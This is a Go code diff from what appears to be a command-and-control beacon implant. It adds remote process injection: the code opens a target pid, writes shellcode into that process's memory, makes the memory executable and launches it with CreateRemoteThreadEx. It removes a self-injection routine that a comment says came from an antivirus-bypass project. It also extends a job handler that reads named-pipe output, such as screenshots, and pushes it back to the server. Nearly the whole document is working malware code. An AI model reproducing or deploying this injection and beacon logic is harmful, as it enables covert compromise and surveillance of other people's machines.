@@ -22,6 +22,7 @@ var (
 	advapi32                = windows.NewLazyDLL("Advapi32.dll")
 	virtualAllocEx          = kernel32.NewProc("VirtualAllocEx")
 	virtualProtectEx        = kernel32.NewProc("VirtualProtectEx")
+	createRemoteThreadEx    = kernel32.NewProc("CreateRemoteThreadEx")
 	queueUserAPC            = kernel32.NewProc("QueueUserAPC")
 	rtlCopyMemory           = ntdll.NewProc("RtlCopyMemory")
 	createThread            = kernel32.NewProc("CreateThread")
@@ -34,20 +35,14 @@ var (
 
 // implement of beacon.Job
 
-func InjectDllSelfX86(dll []byte) error {
-	if sysinfo.IsProcessX64() {
-		return errors.New("can not inject x86 dll into x64 beacon")
-	} else {
-		return InjectSelf(dll)
+// inject command specify a pid to inject, so it seems no need to adjust whether it is x86 or x64
+// TODO still didn't work
+func InjectDll(pid uint32, dll []byte) error {
+	processHandle, err := windows.OpenProcess(windows.PROCESS_CREATE_THREAD|windows.PROCESS_VM_OPERATION|windows.PROCESS_VM_WRITE|windows.PROCESS_VM_READ|windows.PROCESS_QUERY_INFORMATION, true, pid)
+	if err != nil {
+		return errors.New(fmt.Sprintf("OpenProcess error: %s", err))
 	}
-}
-
-func InjectDllSelfX64(dll []byte) error {
-	if !sysinfo.IsProcessX64() {
-		return errors.New("can not inject x64 dll into x86 beacon")
-	} else {
-		return InjectSelf(dll)
-	}
+	return CreateRemoteThread(processHandle, dll)
 }
 
 // you should ensure x86 shellcode inject to x86 process
@@ -151,61 +146,68 @@ func callUserAPC(procInfo *windows.ProcessInformation, shellcode []byte) error {
 	return nil
 }
 
-// copy from GolangBypassAV CreateThreadNative
-func InjectSelf(shellcode []byte) error {
-	addr, err := windows.VirtualAlloc(0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
-	if err != nil {
-		return errors.New(fmt.Sprintf("VirtualAlloc error: %s", err.Error()))
+func CreateRemoteThread(processHandle windows.Handle, shellcode []byte) error {
+	addr, _, errVirtualAlloc := virtualAllocEx.Call(uintptr(processHandle), 0, uintptr(len(shellcode)), windows.MEM_COMMIT|windows.MEM_RESERVE, windows.PAGE_READWRITE)
+
+	if errVirtualAlloc != nil && errVirtualAlloc != windows.SEVERITY_SUCCESS {
+		return errors.New(fmt.Sprintf("VirtualAllocEx error: %s", errVirtualAlloc))
 	}
 
 	if addr == 0 {
-		return errors.New("VirtualAlloc failed and returned 0")
+		return errors.New("[!]VirtualAllocEx failed and returned 0")
+	}
+	var writtenBytes uintptr
+	errWriteProcessMemory := windows.WriteProcessMemory(processHandle, addr, &shellcode[0], uintptr(len(shellcode)), &writtenBytes)
+
+	if errWriteProcessMemory != nil && errWriteProcessMemory != windows.SEVERITY_SUCCESS {
+		return errors.New(fmt.Sprintf("[!]Error calling WriteProcessMemory: %s", errWriteProcessMemory))
 	}
 
-	_, _, errRtlCopyMemory := rtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
-
-	if errRtlCopyMemory != nil && errRtlCopyMemory != windows.SEVERITY_SUCCESS {
-		return errors.New(fmt.Sprintf("RtlCopyMemory error: %s", errRtlCopyMemory.Error()))
+	oldProtect := windows.PAGE_READWRITE
+	_, _, errVirtualProtectEx := virtualProtectEx.Call(uintptr(processHandle), addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, uintptr(unsafe.Pointer(&oldProtect)))
+	if errVirtualProtectEx != nil && errVirtualProtectEx != windows.SEVERITY_SUCCESS {
+		return errors.New(fmt.Sprintf("Error calling VirtualProtectEx: %s", errVirtualProtectEx))
 	}
-	oldProtect := uint32(windows.PAGE_READWRITE)
-	err = windows.VirtualProtect(addr, uintptr(len(shellcode)), windows.PAGE_EXECUTE_READ, &oldProtect)
-	if err != nil {
-		return errors.New(fmt.Sprintf("VirtualProtect error: %s", err.Error()))
 
+	_, _, errCreateRemoteThreadEx := createRemoteThreadEx.Call(uintptr(processHandle), 0, 0, addr, 0, 0, 0)
+	if errCreateRemoteThreadEx != nil && errCreateRemoteThreadEx != windows.SEVERITY_SUCCESS {
+		return errors.New(fmt.Sprintf("[!]Error calling CreateRemoteThreadEx: %s", errCreateRemoteThreadEx))
 	}
-	//var lpThreadId uint32
-	thread, _, errCreateThread := createThread.Call(0, 0, addr, uintptr(0), 0, 0)
 
-	if errCreateThread != nil && errCreateThread != windows.SEVERITY_SUCCESS {
-		return errors.New(fmt.Sprintf("CreateThread error: %s", errCreateThread.Error()))
-	}
-	_, err = windows.WaitForSingleObject(windows.Handle(thread), 0xFFFFFFFF)
-	if err != nil {
-		return errors.New(fmt.Sprintf("WaitForSingleObject error: %s", err.Error()))
+	errCloseHandle := windows.CloseHandle(processHandle)
+	if errCloseHandle != nil {
+		return errors.New(fmt.Sprintf("[!]Error calling CloseHandle: %s", errCloseHandle))
 	}
 	return nil
 }
 
 func HandlerJob(b []byte) error {
 	buf := bytes.NewBuffer(b)
-	// read first zero bytes
-	_, _ = ParseAnArg(buf)
+	// inject it gives pid, spawn it gives zero
+	pidByte := make([]byte, 4)
 	callbackTypeByte := make([]byte, 2)
 	sleepTimeByte := make([]byte, 2)
+	_, _ = buf.Read(pidByte)
 	_, _ = buf.Read(callbackTypeByte)
 	_, _ = buf.Read(sleepTimeByte)
 	callbackType := packet.ReadShort(callbackTypeByte)
-
 	sleepTime := packet.ReadShort(sleepTimeByte)
 	pipeName, _ := ParseAnArg(buf)
 	// command type, seems useless?
-	_, _ = ParseAnArg(buf)
-	// sleep time is 1
+	commandType, _ := ParseAnArg(buf)
+	// sleep time some time is small, some time is huge, so set it to Microsecond
 	fmt.Printf("Sleep time: %d\n", sleepTime)
-	time.Sleep(time.Second * time.Duration(sleepTime))
+	time.Sleep(time.Microsecond * time.Duration(sleepTime))
 	result, err := ReadNamedPipe(pipeName)
 	if err != nil {
 		return err
+	}
+
+	switch string(commandType) {
+	case "take screenshot":
+		// take screenshot will have 4 bytes to indicate the data length, but server doesn't deal with it
+		result = result[4:]
+	default:
 	}
 	finalPacket := packet.MakePacket(int(callbackType), []byte(result))
 	packet.PushResult(finalPacket)
@@ -215,7 +217,11 @@ func HandlerJob(b []byte) error {
 func ReadNamedPipe(pipeName []byte) (string, error) {
 	pipe, err := winio.DialPipe(string(pipeName), nil)
 	if err != nil {
-		return "", err
+		// try it twice
+		pipe, err = winio.DialPipe(string(pipeName), nil)
+		if err != nil {
+			return "", errors.New(fmt.Sprintf("DialPipe error: %s", err))
+		}
 	}
 	defer pipe.Close()
 	result := ""
